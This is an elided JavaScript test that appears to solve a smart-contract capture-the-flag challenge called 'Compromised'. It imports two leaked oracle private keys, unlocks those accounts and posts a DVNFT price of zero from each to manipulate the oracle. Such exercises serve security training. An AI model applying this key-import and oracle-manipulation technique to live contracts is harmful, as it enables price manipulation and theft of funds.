...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {        
        ...
        await web3.eth.personal.importRawKey(
          compromisedOracles[0].privateKey,
          ""
        );
        await web3.eth.personal.unlockAccount(
          compromisedOracles[0].address,
          "",
          10000000
        );
        ...
        await web3.eth.personal.importRawKey(
          compromisedOracles[1].privateKey,
          ""
        );
        await web3.eth.personal.unlockAccount(
          compromisedOracles[1].address,
          "",
          10000000
        );
        ...
        await this.oracle.postPrice("DVNFT", 0, {
          from: compromisedOracles[0].address,
        });
        await this.oracle.postPrice("DVNFT", 0, {
          from: compromisedOracles[1].address,
        });
